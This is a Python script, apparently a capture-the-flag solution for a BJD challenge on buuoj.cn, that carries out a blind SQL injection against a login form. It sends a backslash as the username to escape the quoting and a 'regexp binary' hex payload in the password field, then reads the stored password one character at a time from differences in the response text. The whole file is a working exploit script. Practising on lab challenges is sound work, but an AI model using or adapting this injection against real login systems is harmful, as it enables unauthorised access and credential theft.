import requests


url ="http://0cb5293b-2707-4c4d-afe0-3668c322957c.node3.buuoj.cn/"
temp={}
password =""
string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789']
a = '0x5e'

for i in range(100):
    for j in string:
        str = hex(j).replace('0x', '')
        # 查用户名
        #username = "or username regexp binary %s #" % (a + str)
        #print(username)
        #data = {"username": "\\", "password": username}
        # 查密码
        payload = "or password regexp binary %s #" % (a + str) 
        print(payload)
        data={"username" :"\\" ,"password" : payload }
        r = requests.post(url,data=data)
        #print(r.text)
        if "BJD needs to be stronger" in r.text:
            password +=chr(j)
            print(password)
            a+=str
            break
    if "You konw ,P3rh4ps needs a girl friend" in r.text:
        break

print(password)